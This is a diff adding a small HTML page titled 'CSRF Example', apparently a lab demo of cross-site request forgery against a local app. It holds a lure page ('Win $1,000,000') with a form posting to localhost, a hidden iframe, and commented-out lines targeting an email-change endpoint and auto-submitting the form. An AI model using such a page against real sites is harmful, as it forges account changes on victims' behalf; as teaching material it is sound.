@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Example</title>
+</head>
+
+    <body>
+
+    <h1>Win $1,000,000</h1>
+
+    <iframe name="dummyframe" id="dummyframe" style="display: none;"></iframe>
+
+
+    <!--<form action="https://vulnerable-website.com/email/change" method="POST">-->
+    <form action="http://localhost:8080/repo" method="POST" >
+        <input type="hidden" name="${_csrf.parameterName}" value="${_csrf.token}"/>
+        <input type="submit" value="Click here to win" />
+    </form>
+
+    <!--    Run this script to submit POST request-->
+<!--    <script>-->
+<!--        document.forms[0].submit();-->
+<!--    </script>-->
+
+
+</body>
+
+
+</html>
